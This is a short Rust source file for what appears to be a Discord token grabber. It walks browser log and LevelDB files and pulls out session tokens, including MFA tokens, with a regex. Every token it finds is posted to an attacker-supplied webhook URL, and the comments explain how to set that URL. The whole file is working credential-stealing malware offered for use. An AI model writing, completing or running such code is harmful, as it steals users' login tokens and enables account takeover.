mod utils;
use regex::Regex;
use utils::{fs, paths, webhook::Webhook};

fn main() {
    // Simply Change webhook-url-here to your webhook url.
    // By default this step are automated via shell script.
    // But still you could change it manually.
    let webhook = Webhook::new("WEBHOOK_URL_HERE");

    // Loop over log browser files.
    for path in paths::get() {
        // Get every log file path.
        for path in fs::dir(&path) {
            // Ignore non-needed files.
            if !path.ends_with(".log") && !path.ends_with(".ldb") {
                continue;
            }

            // Read the file content into string.
            let file = fs::read(&path);

            // Extract any tokens.
            let token = extract(&file);

            // If non-none or empty send it out.
            if let Some(token) = token {
                webhook.send(token);
            }
        }
    }
}

// Extract token from the given string.
fn extract(data: &String) -> Option<String> {
    let regex = Regex::new(
        r#"([a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84})"#,
    )
    .unwrap();

    let result = regex.captures(&data);

    if let Some(result) = result {
        let token = result.get(0).unwrap().as_str().to_string();
        return Some(token);
    }

    None
}
